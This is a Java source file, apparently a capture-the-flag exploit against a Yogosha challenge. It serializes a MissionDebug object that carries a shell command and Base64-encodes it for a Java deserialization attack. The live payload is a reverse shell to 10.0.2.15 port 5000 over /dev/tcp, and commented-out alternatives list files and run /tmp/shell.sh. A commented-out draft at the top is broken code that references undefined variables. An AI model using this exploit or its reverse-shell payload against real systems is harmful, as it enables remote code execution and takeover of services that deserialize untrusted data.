// import com.yogosha.data.Foo;
// import java.io.ByteArrayInputStream;
// import java.io.ByteArrayOutputStream;
// import java.io.ObjectInputStream;
// import java.io.ObjectOutputStream;
// import java.io.Serializable;
// import java.util.Base64;
// import javax.servlet.http.Cookie;

// class Main {
//     public static void main(String[] args) throws Exception {
//         String className = "com.yogosha.utils.MissionDebug";
//         Class debugClass =  Class.forName(className);
//         debugClass.getField("debug").setAccessible(true);
//         Field debug = debugClass.getField("debug");
//         debug = "ls && cat *";

//         // debugClass.getC("readObject", )
//         Constructor[] constructorArr = zooClass.getConstructors();
//         constructorArr[0].newInstance();

//         Foo originalObject = new Foo("str", 123);

//         String serializedObject = serialize(originalObject);

//         System.out.println("Serialized object: " + serializedObject);

//         Foo deserializedObject = deserialize(serializedObject);

//         System.out.println("Deserialized com.yogosha.data str: " + deserializedObject.str + ", num: " + deserializedObject.num);
//     }

//     private static String serialize(Serializable obj) throws Exception {
//         ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
//         try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
//             out.writeObject(obj);
//         }
//         return Base64.getEncoder().encodeToString(baos.toByteArray());
//     }

//     private static <T> T deserialize(String base64SerializedObj) throws Exception {
//         try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
//             @SuppressWarnings("unchecked")
//             T obj = (T) in.readObject();
//             return obj;
//         }
//     }
// }
package com.yogosha;

import com.yogosha.utils.MissionDebug;
import com.yogosha.data.Foo;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

class Main {
        public static void main(String[] args) throws Exception {
        String req = "sh -i >& /dev/tcp/10.0.2.15/5000 0>&1";
//        String req = "ls && cat *";
        //String req = "bash /tmp/shell.sh";
        MissionDebug missionDebug = new MissionDebug(req);
        String serializedObject = serialize(missionDebug);
        System.out.println("Serialized object: " + serializedObject);
        //list(serializedObject);
        MissionDebug deserializedObject = deserialize(serializedObject);
        System.out.println("Deserialized object ID: " + deserializedObject.toString());
    }
    
    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}